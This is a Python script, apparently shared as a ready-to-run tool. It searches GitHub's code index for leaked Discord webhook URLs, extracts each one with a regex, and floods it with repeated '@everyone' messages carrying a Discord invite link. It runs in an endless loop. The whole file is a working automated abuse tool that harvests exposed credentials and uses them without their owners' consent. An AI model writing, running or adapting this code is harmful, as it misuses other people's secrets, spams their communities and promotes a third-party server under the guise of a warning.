import os
import re
import time
from typing import Optional

try:
    import requests
except ImportError:
    raise RuntimeError(
        "The requests module must be installed\nYou can install it with 'pip install requests'"
    )
try:
    from colorama import Fore, Style, init
except ImportError:
    raise RuntimeError(
        "The colorama module must be installed\nYou can install it with 'pip install colorama'"
    )
try:
    from discord_webhook import DiscordWebhook
except ImportError:
    raise RuntimeError(
        "The discord-webhook module must be installed\nYou can install it with 'pip install discord-webhook'"
    )


GH_TOKEN = "YOUR CLASSIC GITHUB TOKEN"

init(autoreset=True)

GITHUB_URL = "https://api.github.com/search/code"
msg = "@everyone it seems someone leaked your webhook url!!! https://discord.gg/DM8GtTT4rX"
amount = "25"


class DataStorage:
    def __init__(self):
        self.last = ""


data_storage = DataStorage()


def is_valid_webhook(url: str) -> bool:
    try:
        res = requests.post(
            url,
            json={"content": msg},
        )
        return bool(res.status_code == 204)
    except requests.exceptions.RequestException:
        return False


def use_code(url: str, msg: str, amount: int):
    print(f"{Fore.BLUE}Starting with: {Style.RESET_ALL}{url}")

    webhook = DiscordWebhook(url=(url), rate_limit_retry=True, content=((msg)))
    count = 1
    while count <= (amount):
        try:
            webhook.execute()
        except AttributeError:
            pass
        print(Fore.YELLOW + f"Send message #{count}")
        count += 1

    print(f"{Fore.BLUE}Done with {Style.RESET_ALL}{url}")


def get_result() -> Optional[str]:

    github_data = requests.get(
        GITHUB_URL,
        headers={
            "accept": "application/vnd.github+json",
            "Authorization": f"Bearer {GH_TOKEN}",
        },
        params={
            "q": "https://discord.com/api/webhooks/",
            "sort": "indexed",
            "per_page": 1,
        },
    )
    data = github_data.json()

    if "documentation_url" in data.keys():
        if data["message"] == "Bad credentials":
            raise Exception("Invalid Token")
        print(f"{Fore.LIGHTMAGENTA_EX}We are being ratelimited, sleeping for 3 minutes")
        time.sleep(60 * 3)
        print(f"{Fore.LIGHTMAGENTA_EX}Done sleeping, retrying")
        return get_result()

    try:
        url = data["items"][0]["html_url"]
    except IndexError:
        print(f"{Fore.RED}Github sent no items, retrying in 30 seconds")
        time.sleep(30)
        print(f"{Fore.BLUE}Done sleeping, retrying")
        return get_result()

    if url == data_storage.last:
        return
    else:
        data_storage.last = url

    raw_url = url.replace("github.com", "raw.githubusercontent.com").replace(
        "/blob", ""
    )
    return raw_url


def loop(msg: str, amount: int):
    url = get_result()
    if not url:
        return print(f"{Fore.RED}No new result found")

    raw_file_data = requests.get(url).text
    found = re.search(
        R"(?:https?://)?(?:ptb\.|canary\.)?(?:discordapp|discord).com/api/webhooks/\d{15,20}/\S*",
        raw_file_data,
    )
    if not found:
        return print(f"{Fore.RED}Could not find a webhook url, maybe soon..")

    webhook_url = found[0]

    TO_REMOVE = ('"', "'", "`", ")", "(", "[", "]", "{", "}")

    for item in TO_REMOVE:
        if item in webhook_url:
            webhook_url = webhook_url.split(item)[0]

    print(f"{Fore.GREEN}Found {Style.RESET_ALL}{webhook_url}")

    if is_valid_webhook(webhook_url):
        use_code(webhook_url, msg, amount)
    else:
        return print(f"{Fore.RED}Webhook Invalid")


def ask(msg, convertor):
    try:
        return convertor(input(msg))
    except ValueError:
        print(f"{Fore.RED}Invalid Input")
        return ask(msg, convertor)


def main():
    os.system("cls" if os.name == "nt" else "clear")
    print(
        f"{Fore.CYAN}\r\n\n                       ▄▀▄     ▄▀▄" + "\n"
        "                      ▄█░░▀▀▀▀▀░░█▄" + "\n"
        "                  ▄▄  █░░░░░░░░░░░█" + "\n"
        "                 █▄▄█ █░░▀░░┬░░▀░░█ █▄▄█" + "\n"
        "\n"
        "                 Author: Kars#9142\n"
        "                 GitHub: https://github.com/ArabicCat\n"
        "                 Credits: Thanks to cibere#0001 for create the automated version!\n\n"
    )

    while True:
        loop(msg, amount)
        time.sleep(30)


if __name__ == "__main__":
    main()
